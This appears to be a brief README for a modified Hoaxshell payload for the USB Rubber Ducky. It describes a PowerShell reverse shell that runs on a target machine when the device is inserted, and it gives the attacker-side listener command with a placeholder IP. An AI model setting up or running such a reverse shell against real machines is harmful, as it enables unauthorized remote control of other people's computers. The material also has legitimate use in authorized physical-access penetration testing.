Modified Hoaxshell for the usb RubberDucky:
-------------------------------------------

Powershell reverse shell with Authorization ID using Hoaxshell,after we insert the USB RubberDucky wait a few seconds for the payload to load and when its done the Capslook turns ON/OFF on target
-------------------------------------------
on the attacker machine use the -g to remember the Authorization id
./hoaxshell.py -s X.X.X.X -r -g -H "Authorization"


------------------------------------------------------
